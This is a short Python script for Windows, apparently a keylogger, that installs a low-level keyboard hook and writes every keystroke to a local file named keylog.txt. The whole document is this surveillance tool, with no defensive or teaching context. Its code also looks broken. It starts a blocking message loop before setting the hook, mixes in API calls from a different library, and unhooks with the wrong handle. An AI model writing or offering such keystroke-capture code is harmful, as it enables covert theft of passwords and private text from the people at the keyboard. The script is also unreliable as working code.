import win32api
import win32con
import win32gui
import win32process
import time
import os
import logging

# Set up logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Get the current process ID
pid = win32api.GetCurrentProcessId()

# Get the handle of the current process
handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, False, pid)

# Get the process name
process_name = win32process.GetModuleFileNameEx(handle, 0)

# Close the handle
win32api.CloseHandle(handle)

# Function to log keystrokes
def OnKeyboardEvent(event):
    if event.Ascii:
        logging.info(f"{chr(event.Ascii)}")
    else:
        logging.info(f"{event.Key}")
    return True

# Hook the keyboard
win32gui.PumpMessages()

# Start monitoring keystrokes
win32gui.SetWindowsHookEx(win32con.WH_KEYBOARD_LL, OnKeyboardEvent, None, 0)

# Run the program until interrupted
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    pass

# Clean up
win32gui.UnhookWindowsHookEx(win32gui.GetCurrentThreadId())